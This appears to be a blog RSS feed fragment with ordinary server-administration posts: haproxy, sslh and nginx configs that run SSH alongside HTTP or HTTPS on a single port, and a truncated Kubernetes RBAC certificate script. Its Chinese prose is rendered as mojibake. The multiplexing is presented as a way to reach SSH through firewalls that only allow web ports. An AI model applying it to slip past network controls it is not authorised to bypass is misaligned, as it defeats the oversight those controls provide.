&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make &lt;span class=&#34;nv&#34;&gt;TARGET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;linux2628 &lt;span class=&#34;nv&#34;&gt;PREFIX&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/servers/haproxy &lt;span class=&#34;nv&#34;&gt;USE_GETADDRINFO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_ZLIB&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_REGPARM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_OPENSSL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nv&#34;&gt;USE_SYSTEMD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_PCRE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_PCRE_JIT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;USE_NS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make install &lt;span class=&#34;nv&#34;&gt;PREFIX&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/servers/haproxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘ haproxy.conf é…ç½®æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;global &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;maxconn 5120  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;chroot /export/servers/haproxy   &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;daemon &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;quiet &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;nbproc 2 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;pidfile /tmp/haproxy.pid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;defaults &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;timeout connect 5s &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;timeout client 50s &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;timeout server 20s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;listen http &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;bind :80 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;timeout client 1h &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;tcp-request inspect-delay 2s &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;acl is_http req_proto_http &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;tcp-request content accept if is_http &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;server server-http :8080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;use_backend ssh if !is_http&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;backend ssh &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;mode tcp &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;timeout server 1h &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;server server-ssh :22&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼šæˆ‘ä»¬åœ¨ 8080 ç«¯å£å¼€äº† http æœåŠ¡ï¼Œåœ¨ 22 ç«¯å£å¼€äº† ssh æœåŠ¡ï¼Œ80ç«¯å£ç”± haproxy åšä»£ç†è½¬å‘ï¼Œé¦–å…ˆåˆ¤æ–­å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦æ˜¯ http è¯·æ±‚ï¼Œå¦‚æœæ˜¯å°±è½¬å‘åˆ° 8080 ç«¯å£ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±è½¬å‘åˆ° 22 ç«¯å£ï¼Œè¿™æ ·å°±å®ç°äº† 80 ç«¯å£åŒæ—¶è·‘ http å’Œ ssh ä¸¤ä¸ªæœåŠ¡ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>sslhçš„ä¸€ä¸ªç«¯å£åŒæ—¶è·‘å¤šä¸ªæœåŠ¡</title>
      <link>https://rendoumi.com/posts/20211110-sslh_multiple_port/</link>
      <pubDate>Wed, 10 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211110-sslh_multiple_port/</guid>
      <description>&lt;p&gt;Ucloudçš„æœºå™¨åœ¨ä¸¤ä¼šæœŸé—´å¹²è„†ç«¯å£å…¨ç­ï¼Œfirewallè®¾ç½®è¿›æ¥çš„ç«¯å£å…¨å…³é—­ï¼ï¼ï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;è¿˜å¥½æœ‰ä¸ªGlobal sshçš„æœåŠ¡ï¼Œå¯ä»¥ ssh &lt;a href=&#34;mailto:ubuntu@111.129.37.89.ipssh.net&#34;&gt;ubuntu@111.129.37.89.ipssh.net&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç™»å½•ä¸Šå»ï¼Œæ³¨æ„ï¼Œç›´æ¥ssh &lt;a href=&#34;mailto:ubuntu@111.129.37.89&#34;&gt;ubuntu@111.129.37.89&lt;/a&gt;æ˜¯ä¸é€šçš„ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æˆ‘ä»¬å°±æ­å»ºä¸€ä¸ªSSLHæœåŠ¡ï¼Œå¯ä»¥æŠŠsshå’Œopenvpnä»¥åŠsslæœåŠ¡ç»Ÿç»Ÿå¡åˆ°ä¸€ä¸ªç«¯å£22é‡Œ&lt;/p&gt;
&lt;p&gt;åŠ¨æ‰‹å§&lt;/p&gt;
&lt;p&gt;1ã€ä¿®æ”¹opensshçš„ç«¯å£ ä»22ç«¯å£æ”¹æˆ2222ï¼Œåƒä¸‡åˆ«é‡å¯ï¼Œ22è¿™ä¼šå…ˆå¾—å½’sshç”¨&lt;/p&gt;
&lt;p&gt;2ã€å®‰è£…sslh&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install sslh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/default/sslh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;æ‰¾åˆ°Run&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;æ”¹æˆRun&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç„¶ååˆ°ä¸‹é¢ï¼ŒæŒ‰éœ€é…ç½®ï¼ˆä¸è·‘443çš„è¯å¯ä»¥ä¸é…ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DAEMON_OPTS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--user sslh --listen 0.0.0.0:22 --ssh 127.0.0.1:2222 --ssl 127.0.0.1:443 --openvpn 127.0.0.1:1194 --pidfile /var/run/sslh/sslh.pid --timeout 5&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3ã€é…ç½®sslhå¹¶ä¸”é‡å¯æœåŠ¡å™¨&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo systemctl enable sslh
sudo reboot
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å°±æå®šäº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>Nginxçš„ä¸€ä¸ªç«¯å£åŒæ—¶è·‘SSHå’ŒHTTPSæœåŠ¡</title>
      <link>https://rendoumi.com/posts/20211109-nginx_multiple_port/</link>
      <pubDate>Tue, 09 Nov 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211109-nginx_multiple_port/</guid>
      <description>&lt;p&gt;è¿™ä¸ªè¦æ±‚æŒºå¤æ€ªçš„ï¼ŒèƒŒæ™¯æ˜¯é˜²ç«å¢™åªå¼€äº† nginx 443 ç«¯å£ã€‚æˆ‘ä¹Ÿæƒ³åŒæ—¶ ssh ç™»å½•è¿›å»ï¼Œä½†æ˜¯F5æ²¡å¼€IP&lt;/p&gt;
&lt;p&gt;å°±åªèƒ½è¿™ä¹ˆå¹²äº†ï¼Œè®© Nginx ä¸€ä¸ªç«¯å£è·‘å¤šä¸ªæœåŠ¡&lt;/p&gt;
&lt;p&gt;åœ¨ nginx.conf åŠ ä¸€æ®µï¼Œstream é…ç½®ï¼Œnginx çš„ ip æ˜¯ 192.168.8.110ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Multi Ports&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;stream {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;upstream ssh {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;server 192.168.8.112:22;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;upstream https {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;server 192.168.8.111:443;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;map $ssl_preread_protocol $upstream {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;default ssh;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;&amp;#34;TLSv1.2&amp;#34; https;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;&amp;#34;TLSv1.3&amp;#34; https;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;&amp;#34;TLSv1.1&amp;#34; https;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;&amp;#34;TLSv1.0&amp;#34; https;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# SSH and SSL on the same port&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;server {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;listen 443;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;proxy_pass $upstream;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;na&#34;&gt;ssl_preread on;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æµ‹è¯•ä¸€ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kubernetesåˆ›å»ºæ™®é€šè´¦å·</title>
      <link>https://rendoumi.com/posts/20211109-k8s_rbac/</link>
      <pubDate>Tue, 09 Nov 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211109-k8s_rbac/</guid>
      <description>&lt;p&gt;kubernetes è£…å¥½æ­£å¸¸è¿è¡Œä¸€æ®µæ—¶é—´åï¼Œä¼šå‡ºç°è¦æŠŠç ”å‘å’Œè¿ç»´æƒé™åˆ†å¼€çš„åœºæ™¯ï¼š&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç»™æŸä¸ªç”¨æˆ·æŸä¸€æŒ‡å®šåç§°ç©ºé—´ä¸‹çš„ç®¡ç†æƒé™&lt;/li&gt;
&lt;li&gt;ç»™ç”¨æˆ·èµ‹äºˆé›†ç¾¤çš„åªè¯»æƒé™&lt;/li&gt;
&lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;éå¸¸éº»çƒ¦ï¼Œæˆ‘ä»¬è¿™é‡Œä¸è®¨è®ºè¿‡å¤šçš„æ¦‚å¿µï¼Œä»è¿ç»´çš„è§’åº¦å‡ºå‘ï¼Œç®€å•å®ç”¨åŒ–&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æˆ‘ä»¬éœ€è¦æ˜ç¡®ä¸‰ä¸ªRBACæœ€åŸºæœ¬çš„æ¦‚å¿µ&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Role: è§’è‰²ï¼Œå®ƒå®šä¹‰äº†ä¸€ç»„è§„åˆ™ï¼Œå®šä¹‰äº†ä¸€ç»„å¯¹Kubernetes APIå¯¹è±¡çš„æ“ä½œæƒé™&lt;/li&gt;
&lt;li&gt;RoleBinding: å®šä¹‰äº†&amp;quot;è¢«ä½œç”¨è€…&amp;quot;å’Œ&amp;quot;è§’è‰²&amp;quot;çš„ç»‘å®šå…³ç³»&lt;/li&gt;
&lt;li&gt;Subject: è¢«ä½œç”¨è€…ï¼Œæ—¢å¯ä»¥æ˜¯&amp;quot;äºº&amp;quot;ï¼Œä¹Ÿå¯ä»¥æ˜¯æœºå™¨ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ˜¯ Kubernetes ä¸­å®šä¹‰çš„ç”¨æˆ·(ServiceAccountä¸»è¦è´Ÿè´£kuberneteså†…ç½®ç”¨æˆ·)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æˆ‘ä»¬çš„æ“ä½œè¿‡ç¨‹æµç¨‹å¦‚ä¸‹ï¼Œé¦–å…ˆåˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦ï¼›å…¶æ¬¡åˆ›å»ºRoleè§’è‰²ï¼›å†åˆ›å»ºRoleBindingï¼ŒæŠŠSubjectå’ŒRoleç»‘å®šï¼Œå°±å®Œäº‹äº†ï¼›æœ€åä¸€æ­¥æ˜¯ç”Ÿæˆ kubectl çš„é…ç½®æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€åˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦&#34;&gt;ä¸€ã€åˆ›å»ºå®¢æˆ·ç«¯è¯ä¹¦&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;æˆ‘ä»¬ä»¥å·²å»ºå¥½çš„é˜¿é‡Œ ACK ä¸ºä¾‹ï¼Œæˆ–è€…è‡ªå»ºå¥½çš„ Kubernetes ä¹Ÿè¡Œï¼›ç¡®å®šå·²ç»æœ‰äº† .kube/config é…ç½®æ–‡ä»¶ï¼Œæ‹¥æœ‰é›†ç¾¤æœ€é«˜æƒé™ï¼Œå¹¶ä¸”å¯ä»¥æ­£å¸¸æ‰§è¡Œ kubectl å‘½ä»¤ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜¯ç”Ÿæˆè¯ä¹¦ï¼Œå¹¶å‘é›†ç¾¤æå‡ºè¯ä¹¦è¯·æ±‚å¹¶ç­¾å‘ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;useraccount&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;reader
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;openssl req -new -newkey rsa:4096 -nodes -keyout &lt;span class=&#34;nv&#34;&gt;$useraccount&lt;/span&gt;-k8s.key -out &lt;span class=&#34;nv&#34;&gt;$useraccount&lt;/span&gt;-k8s.csr -subj &lt;span class=&#34;s2&#34;&gt;&amp;#34;/CN=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$useraccount&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/O=devops&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;csr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;cat &lt;span class=&#34;nv&#34;&gt;$useraccount&lt;/span&gt;-k8s.csr &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tr -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt; k8s-csr.yaml  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;apiVersion: certificates.k8s.io/v1beta1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;kind: CertificateSigningRequest
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  name: $useraccount-k8s-access
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;spec:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  groups:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  - system:authenticated
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  request: $csr
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  usages:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  - client auth
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl create -f k8s-csr.yaml  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl certificate approve &lt;span class=&#34;nv&#34;&gt;$useraccount&lt;/span&gt;-k8s-access  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
